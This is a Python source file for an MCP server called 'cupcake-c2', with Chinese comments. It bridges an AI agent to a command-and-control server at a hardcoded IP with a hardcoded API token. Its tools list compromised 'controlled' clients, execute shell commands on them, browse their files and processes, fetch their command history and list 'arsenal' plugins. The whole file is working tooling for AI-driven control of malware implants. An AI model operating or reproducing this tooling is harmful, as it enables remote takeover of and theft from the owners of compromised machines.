import asyncio
import requests
import sys
import json
from mcp.server import Server
from mcp.server.models import InitializationOptions
import mcp.types as types
from mcp.server.stdio import stdio_server

# --- C2 设置 ---
C2_SERVER = "http://192.168.2.134:9999"
API_TOKEN = "Qk2KIEy8Yh6BlHW7u369guS1aJRSe4.r"

# 初始化原生 MCP 服务器 (无 FastMCP 噪音)
server = Server("cupcake-c2", version="1.0.0")

def c2_request(method, endpoint, params=None, json_data=None):
    try:
        url = f"{C2_SERVER}{endpoint}"
        headers = {"Authorization": f"Bearer {API_TOKEN}", "Content-Type": "application/json"}
        resp = requests.request(method, url, headers=headers, params=params, json=json_data, timeout=15)
        return resp.text
    except Exception as e:
        return str(e)

@server.list_tools()
async def handle_list_tools() -> list[types.Tool]:
    """列出所有可用的 C2 工具"""
    return [
        types.Tool(
            name="get_clients",
            description="获取所有在线客户端列表",
            inputSchema={"type": "object", "properties": {}},
        ),
        types.Tool(
            name="send_cmd",
            description="执行 Shell 指令",
            inputSchema={
                "type": "object",
                "properties": {
                    "uuid": {"type": "string"},
                    "cmd": {"type": "string"}
                },
                "required": ["uuid", "cmd"]
            },
        ),
        types.Tool(
            name="list_plugins",
            description="获取武器库插件列表",
            inputSchema={"type": "object", "properties": {}},
        ),
        types.Tool(
            name="list_files",
            description="获取受控端文件列表",
            inputSchema={
                "type": "object",
                "properties": {
                    "uuid": {"type": "string", "description": "受控端 UUID"},
                    "path": {"type": "string", "description": "目录路径，默认为当前目录"}
                },
                "required": ["uuid"]
            },
        ),
        types.Tool(
            name="list_processes",
            description="获取受控端进程列表",
            inputSchema={
                "type": "object",
                "properties": {
                    "uuid": {"type": "string", "description": "受控端 UUID"}
                },
                "required": ["uuid"]
            },
        ),
        types.Tool(
            name="get_history",
            description="获取受控端指令执行历史及结果",
            inputSchema={
                "type": "object",
                "properties": {
                    "uuid": {"type": "string", "description": "受控端 UUID"}
                },
                "required": ["uuid"]
            },
        )
    ]

@server.call_tool()
async def handle_call_tool(
    name: str, arguments: dict | None
) -> list[types.TextContent]:
    """处理工具调用"""
    if name == "get_clients":
        res = c2_request("GET", "/api/clients")
        return [types.TextContent(type="text", text=res)]
    
    elif name == "send_cmd":
        res = c2_request("POST", "/api/cmd", json_data=arguments)
        return [types.TextContent(type="text", text=res)]
        
    elif name == "list_plugins":
        res = c2_request("GET", "/api/plugins")
        return [types.TextContent(type="text", text=res)]

    elif name == "list_files":
        params = {"uuid": arguments.get("uuid"), "path": arguments.get("path", "")}
        res = c2_request("GET", "/api/files/list", params=params)
        return [types.TextContent(type="text", text=res)]

    elif name == "list_processes":
        params = {"uuid": arguments.get("uuid")}
        res = c2_request("GET", "/api/processes/list", params=params)
        return [types.TextContent(type="text", text=res)]
        
    elif name == "get_history":
        uuid_val = arguments.get("uuid")
        res = c2_request("GET", f"/api/clients/history/{uuid_val}")
        return [types.TextContent(type="text", text=res)]
        
    raise ValueError(f"Unknown tool: {name}")

async def main():
    async with stdio_server() as (read_stream, write_stream):
        await server.run(
            read_stream,
            write_stream,
            server.create_initialization_options(),
        )

if __name__ == "__main__":
    # 强制 Python 不要缓冲 stdout，确保消息立即发出
    asyncio.run(main())
